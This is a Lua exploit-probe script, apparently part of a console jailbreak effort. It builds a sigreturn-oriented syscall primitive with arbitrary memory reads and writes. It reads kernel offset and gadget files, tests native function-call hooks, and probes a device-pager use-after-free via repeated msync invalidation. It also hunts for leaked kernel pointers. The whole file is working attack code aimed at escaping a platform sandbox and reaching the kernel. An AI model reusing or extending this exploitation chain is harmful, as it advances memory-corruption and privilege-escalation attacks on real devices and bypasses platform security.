-- CRASH_CLASS: MODERATE
-- PROBE 144a: Three critical tests in one probe
-- [A] Read kernel_offset.lua fully (especially 6.00+ and 14.10)
-- [B] Test native_invoke cmd=2 for direct syscalls
-- [C] msync(65) on GPU-mmap pages — CVE-2026-49418 device-pager UAF test
-- [D] Try sceKernelGetModuleInfoFromAddr on kernel-range addresses

print("=== PROBE 144a: KOFFSETS + MSYNC + NATIVE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(addr, val) memory.write_dword(addr, val) end
local function wq(addr, val) memory.write_qword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))
print("sc_addr=" .. hex(sc_addr))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- [A] Read kernel_offset.lua fully — focus on versions 6.00+
--------------------------------------------------------------------
print("")
print("--- [A] kernel_offset.lua full read ---")

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

local function read_file_srop(path, max_bytes)
    max_bytes = max_bytes or 32768
    local path_buf = gpu + 0x100
    make_path(path_buf, path)

    local rv_o = srop(5, ua(path_buf), uint64(0))
    local oh, ol = get_hi_lo(rv_o)
    if ol >= 256 or oh ~= 0 then
        return nil, "open failed ret=" .. ol
    end
    local fd = ol

    local rbuf = gpu + 0x10000
    local total = 0
    local text = ""

    for chunk = 0, 63 do
        for off = 0, 0xFFF, 4 do wd(rbuf + off, 0) end
        local rv_r = srop(3, uint64(fd), ua(rbuf), uint64(4096))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl == 0 or rrl > 4096 then break end
        total = total + rrl
        for ci = 0, math.min(rrl - 1, 4095) do
            local word_off = ci - (ci % 4)
            local w = safe_rd(rbuf + word_off)
            if w then
                local shift = (ci % 4) * 8
                local ch = math.floor(w / (2^shift)) % 256
                if ch >= 32 and ch < 127 then
                    text = text .. string.char(ch)
                elseif ch == 10 then text = text .. "\n"
                elseif ch == 9 then text = text .. "\t"
                elseif ch == 0 then break
                else text = text .. "."
                end
            end
        end
        if rrl < 4096 or total >= max_bytes then break end
    end
    srop(6, uint64(fd))
    return text, total
end

local ko_text, ko_total = read_file_srop("/savedata0/kernel_offset.lua", 20000)
if ko_text then
    print("[A] kernel_offset.lua: " .. ko_total .. " bytes total")
    -- Print from byte 3000 onward (we already have the first 4000 from 143i)
    if #ko_text > 3000 then
        local pos = 3001
        local printed = 0
        while pos <= #ko_text and printed < 14000 do
            local nl = ko_text:find("\n", pos) or math.min(pos + 200, #ko_text + 1)
            local line = ko_text:sub(pos, nl - 1)
            print(line)
            pos = nl + 1
            printed = printed + #line + 1
        end
    else
        -- Print everything
        local pos = 1
        while pos <= #ko_text do
            local nl = ko_text:find("\n", pos) or math.min(pos + 200, #ko_text + 1)
            print(ko_text:sub(pos, nl - 1))
            pos = nl + 1
        end
    end
else
    print("[A] FAILED: " .. tostring(ko_total))
end

-- Also read offsets.lua (game-specific gadgets)
print("")
print("--- [A2] offsets.lua ---")
local off_text, off_total = read_file_srop("/savedata0/offsets.lua", 20000)
if off_text then
    print("[A2] offsets.lua: " .. off_total .. " bytes")
    local pos = 1
    local printed = 0
    while pos <= #off_text and printed < 12000 do
        local nl = off_text:find("\n", pos) or math.min(pos + 200, #off_text + 1)
        local line = off_text:sub(pos, nl - 1)
        print(line)
        pos = nl + 1
        printed = printed + #line + 1
    end
else
    print("[A2] FAILED: " .. tostring(off_total))
end

--------------------------------------------------------------------
-- [B] Test native_invoke for direct function calls
--------------------------------------------------------------------
print("")
print("--- [B] native_invoke ---")

if native_invoke then
    -- cmd=2: fcall(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
    -- Try getpid
    local ok, rv = pcall(function()
        return native_invoke(2, syscall.syscall_address, 20)
    end)
    if ok then
        print("[B] native_invoke getpid=" .. tostring(rv))
    else
        print("[B] native_invoke getpid FAIL: " .. tostring(rv))
    end

    -- Try getuid
    ok, rv = pcall(function()
        return native_invoke(2, syscall.syscall_address, 24)
    end)
    if ok then
        print("[B] native_invoke getuid=" .. tostring(rv))
    else
        print("[B] native_invoke getuid FAIL: " .. tostring(rv))
    end

    -- cmd=0: read_buffer(addr, size) — try reading eboot header
    if eboot_base then
        ok, rv = pcall(function()
            return native_invoke(0, eboot_base, 16)
        end)
        if ok then
            print("[B] native_invoke read eboot: type=" .. type(rv))
            if type(rv) == "string" then
                local bytes = ""
                for i = 1, math.min(#rv, 16) do
                    bytes = bytes .. string.format("%02X ", string.byte(rv, i))
                end
                print("[B] eboot bytes: " .. bytes)
            else
                print("[B] eboot rv=" .. tostring(rv))
            end
        else
            print("[B] native_invoke read eboot FAIL: " .. tostring(rv))
        end
    end

    -- Try reading from libkernel
    if libkernel_base then
        ok, rv = pcall(function()
            return native_invoke(0, libkernel_base + 0x10000, 16)
        end)
        if ok and type(rv) == "string" then
            local bytes = ""
            for i = 1, math.min(#rv, 16) do
                bytes = bytes .. string.format("%02X ", string.byte(rv, i))
            end
            print("[B] libkernel+0x10000: " .. bytes)
        else
            print("[B] libkernel read: " .. tostring(rv))
        end
    end
else
    print("[B] native_invoke not available")
end

-- Also test fcall (it's a table, not function)
print("")
print("--- [B2] fcall table ---")
if type(fcall) == "table" then
    -- fcall is likely a callable table (has __call metamethod)
    -- Try fcall(addr)(args)
    local ok, fn = pcall(function()
        return fcall(syscall.syscall_address, 20)
    end)
    if ok then
        print("[B2] fcall() returned type=" .. type(fn))
        if type(fn) == "function" then
            local ok2, rv2 = pcall(fn)
            if ok2 then
                print("[B2] fcall getpid result=" .. tostring(rv2))
            else
                print("[B2] fcall getpid call FAIL: " .. tostring(rv2))
            end
        elseif type(fn) == "number" or (type(fn) == "table" and fn.tonumber) then
            print("[B2] fcall returned directly=" .. tostring(fn))
        end
    else
        print("[B2] fcall FAIL: " .. tostring(fn))
    end
end

--------------------------------------------------------------------
-- [C] msync(65) on GPU-mmap pages — CVE-2026-49418
-- MS_SYNC=0, MS_ASYNC=1, MS_INVALIDATE=2
-- If msync(MS_INVALIDATE) returns 0, the device-pager path is reachable
--------------------------------------------------------------------
print("")
print("--- [C] msync(65) CVE-2026-49418 ---")

-- Map additional GPU pages for testing
local gpu2_rv = srop(477, uint64(0), uint64(0x100000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
local g2h, g2l = get_hi_lo(gpu2_rv)
print("[C] gpu2=" .. hex(gpu2_rv))

-- Write test patterns
wd(to_num(gpu2_rv), 0xDEADBEEF)
wd(to_num(gpu2_rv) + 4, 0xCAFEBABE)

-- Try msync(65) with different flags on gpu2
-- MS_SYNC = 0x0000
local rv_ms0 = srop(65, ua(gpu2_rv), uint64(0x4000), uint64(0))
local ms0h, ms0l = get_hi_lo(rv_ms0)
print("[C] msync(gpu2, 0x4000, MS_SYNC=0) ret=" .. ms0l .. " hi=" .. ms0h)

-- MS_ASYNC = 0x0001
local rv_ms1 = srop(65, ua(gpu2_rv), uint64(0x4000), uint64(1))
local ms1h, ms1l = get_hi_lo(rv_ms1)
print("[C] msync(gpu2, 0x4000, MS_ASYNC=1) ret=" .. ms1l .. " hi=" .. ms1h)

-- MS_INVALIDATE = 0x0002 — THIS IS THE ONE FOR CVE-2026-49418
local rv_ms2 = srop(65, ua(gpu2_rv), uint64(0x4000), uint64(2))
local ms2h, ms2l = get_hi_lo(rv_ms2)
print("[C] msync(gpu2, 0x4000, MS_INVALIDATE=2) ret=" .. ms2l .. " hi=" .. ms2h)

-- MS_SYNC | MS_INVALIDATE = 0x0002
local rv_ms3 = srop(65, ua(gpu2_rv), uint64(0x4000), uint64(6))
local ms3h, ms3l = get_hi_lo(rv_ms3)
print("[C] msync(gpu2, 0x4000, SYNC|INVAL=6) ret=" .. ms3l .. " hi=" .. ms3h)

-- Check if data survived
local v1 = safe_rd(to_num(gpu2_rv)) or 0
local v2 = safe_rd(to_num(gpu2_rv) + 4) or 0
print("[C] after msync: data[0]=0x" .. string.format("%08X", v1) ..
      " data[4]=0x" .. string.format("%08X", v2))
if v1 == 0xDEADBEEF then
    print("[C] data survived msync")
else
    print("[C] *** DATA CHANGED after msync! Was 0xDEADBEEF now 0x" .. string.format("%08X", v1) .. " ***")
end

-- Also try msync on regular heap allocation
local heap = memory.alloc(0x4000)
wd(heap, 0x12345678)
local rv_msh = srop(65, ua(heap), uint64(0x4000), uint64(2))
local mshh, mshl = get_hi_lo(rv_msh)
print("[C] msync(heap, 0x4000, INVAL=2) ret=" .. mshl .. " hi=" .. mshh)

-- Try on the first GPU mapping too
local rv_ms_gpu1 = srop(65, ua(gpu), uint64(0x4000), uint64(2))
local mg1h, mg1l = get_hi_lo(rv_ms_gpu1)
print("[C] msync(gpu1, 0x4000, INVAL=2) ret=" .. mg1l)

-- Try with larger size
local rv_ms_big = srop(65, ua(gpu2_rv), uint64(0x100000), uint64(2))
local mbh, mbl = get_hi_lo(rv_ms_big)
print("[C] msync(gpu2, 1MB, INVAL=2) ret=" .. mbl)

-- If any msync returned 0, this is HUGE for CVE-2026-49418
if ms2l == 0 then
    print("[C] *** MS_INVALIDATE RETURNS 0! Device pager path may be reachable! ***")
    print("[C] *** CVE-2026-49418 investigation needed! ***")

    -- Try the actual exploit pattern:
    -- 1. mmap GPU pages
    -- 2. msync(MS_INVALIDATE) to trigger vm_object_deallocate on device pager
    -- 3. If pager is reference-counted, this could create a dangling pointer

    -- Measure sys 624 (VM op counter) before and after
    local sc624 = make_syscall(624)
    local ok624a, rv624a = pcall(function() return sc624() end)
    local c_before = 0
    if ok624a then c_before = to_num(rv624a) end

    -- Multiple msync invalidates
    for i = 1, 10 do
        srop(65, ua(gpu2_rv), uint64(0x4000), uint64(2))
    end

    local ok624b, rv624b = pcall(function() return sc624() end)
    local c_after = 0
    if ok624b then c_after = to_num(rv624b) end
    print("[C] sys624 before=" .. c_before .. " after=" .. c_after .. " delta=" .. (c_after - c_before))
end

--------------------------------------------------------------------
-- [D] sceKernelGetModuleInfoFromAddr — try kernel address ranges
--------------------------------------------------------------------
print("")
print("--- [D] sceKernelGetModuleInfoFromAddr ---")

if eboot_addrofs and eboot_addrofs.sceKernelGetModuleInfoFromAddr then
    print("[D] SKIPPED — eboot version not available (libc only)")
end

-- Try via libc
if libc_addrofs and libc_addrofs.sceKernelGetModuleInfoFromAddr then
    local func_addr = libc_addrofs.sceKernelGetModuleInfoFromAddr
    print("[D] sceKernelGetModuleInfoFromAddr=" .. hex(func_addr))

    -- Call it on known userland addresses first to verify it works
    local info_buf = gpu + 0x80000
    for off = 0, 0x1FF, 4 do wd(info_buf + off, 0) end
    wd(info_buf, 0x160)  -- size field

    if native_invoke then
        -- native_invoke(2, func, rax, rdi, rsi, rdx)
        -- sceKernelGetModuleInfoFromAddr(addr, flags, info)
        local ok, rv = pcall(function()
            return native_invoke(2, func_addr, 0,
                eboot_base, 0, ua(info_buf))
        end)
        if ok then
            print("[D] getModInfo(eboot) ret=" .. tostring(rv))
            -- Dump first 64 bytes of result
            for off = 0, 0x3C, 4 do
                local v = safe_rd(info_buf + off) or 0
                if v ~= 0 then
                    print("[D] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
                end
            end
            -- Check for kernel pointers in the full buffer
            for off = 0, 0x158, 8 do
                local q = safe_rq(info_buf + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                        print("[D] *** KPTR at +" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
                    end
                end
            end
        else
            print("[D] getModInfo(eboot) FAIL: " .. tostring(rv))
        end
    else
        -- Use SROP to call the function directly?
        -- sigreturn only does syscalls. We'd need to redirect RIP to the function.
        print("[D] Cannot call without native_invoke")
    end
end

--------------------------------------------------------------------
-- [E] List /savedata0/ directory contents
--------------------------------------------------------------------
print("")
print("--- [E] /savedata0/ listing ---")

-- getdirentries(272) or getdents(SYS_getdents)
-- open dir, read entries
local dir_path = gpu + 0x200
make_path(dir_path, "/savedata0/")
local rv_dir = srop(5, ua(dir_path), uint64(0x10000))  -- O_RDONLY | O_DIRECTORY
local dh, dl = get_hi_lo(rv_dir)
print("[E] open(/savedata0/) ret=" .. dl)

if dl < 256 and dh == 0 then
    local dir_fd = dl
    local dbuf = gpu + 0x90000
    for off = 0, 0x1FFF, 4 do wd(dbuf + off, 0) end

    -- getdirentries(272, fd, buf, nbytes, basep)
    local basep = gpu + 0x88000
    wq(basep, uint64(0))
    local rv_ge = srop(272, uint64(dir_fd), ua(dbuf), uint64(0x2000), ua(basep))
    local geh, gel = get_hi_lo(rv_ge)
    print("[E] getdirentries ret=" .. gel)

    if gel > 0 and gel < 0x2000 then
        -- Parse dirent structures: d_fileno(4), d_reclen(2), d_type(1), d_namlen(1), d_name(...)
        local pos = 0
        while pos < gel do
            local d_fileno = safe_rd(dbuf + pos) or 0
            local d_reclen_type = safe_rd(dbuf + pos + 4) or 0
            local d_reclen = d_reclen_type % 0x10000
            local d_type = math.floor(d_reclen_type / 0x10000) % 256
            local d_namlen = math.floor(d_reclen_type / 0x1000000)

            if d_reclen == 0 then break end

            local name = ""
            for ci = 0, math.min(d_namlen - 1, 63) do
                local off = pos + 8 + ci
                local word_off = off - (off % 4)
                local w = safe_rd(dbuf + word_off) or 0
                local shift = (off % 4) * 8
                local ch = math.floor(w / (2^shift)) % 256
                if ch > 0 and ch < 128 then name = name .. string.char(ch) end
            end

            local type_str = "?"
            if d_type == 4 then type_str = "DIR"
            elseif d_type == 8 then type_str = "REG"
            elseif d_type == 10 then type_str = "LNK" end

            print("[E] " .. type_str .. " " .. name)
            pos = pos + d_reclen
        end
    end
    srop(6, uint64(dir_fd))
end

print("")
print("=== DONE ===")
